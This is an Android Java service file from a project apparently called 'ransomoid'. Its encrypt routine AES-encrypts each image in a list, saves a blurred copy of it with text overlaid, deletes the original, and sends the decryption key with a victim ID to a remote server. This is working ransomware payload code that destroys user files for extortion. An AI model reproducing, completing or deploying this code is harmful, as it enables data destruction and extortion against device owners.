package falezza.fabio.ransomoid.services;

import android.app.Service;
import android.content.Intent;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.util.Base64;
import android.widget.Toast;

import java.io.File;
import java.util.ArrayList;
import java.util.UUID;

import falezza.fabio.ransomoid.utils.AesEncrypter;
import falezza.fabio.ransomoid.utils.Api;
import falezza.fabio.ransomoid.utils.AppDelegate;
import falezza.fabio.ransomoid.utils.FileProcessor;
import falezza.fabio.ransomoid.utils.ImageProcessor;

public class EncryptService extends ParentService {

    public EncryptService() {
        super("EncryptService");
    }

    @Override
    protected void onHandleIntent(@Nullable Intent intent) {
        super.onHandleIntent(intent);
        this.encrypt();
    }

    private void encrypt() {
        this.showMessage("Encrypting...");

        try {
            ImageProcessor imgProcessor = ImageProcessor.getInstance(this);
            AesEncrypter aesEncrypter = AesEncrypter.getInstance();
            aesEncrypter.generateRandomKey();
            this.generateId();
            for (File img : this.imgList) {
                if (!this.isEncrypted(img)) {
                    System.out.println("---- Encrypting image: " + img.getName());

                    imgProcessor.setFile(img);
                    imgProcessor.blur();
                    imgProcessor.drawText();
                    imgProcessor.saveCopy();

                    aesEncrypter.setFile(img);
                    byte[] encrypted = aesEncrypter.encrypt();
                    FileProcessor.getInstance().writeBytesToFile(encrypted,
                            img.getPath() + ".enc");

                    if (!img.delete()) {
                        throw new Exception("Cannot delete file");
                    }
                }
            }

            System.out.println("---- Sending id and key to server...");

            Api.getInstance(this).sendNewRecord(
                    AppDelegate.getInstance(this).getByTag(AppDelegate.userID),
                    Base64.encodeToString(aesEncrypter.getKey(), Base64.NO_WRAP));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void generateId() {
        String uniqueID = UUID.randomUUID().toString();
        AppDelegate.getInstance(this).saveUserID(uniqueID);
    }
}
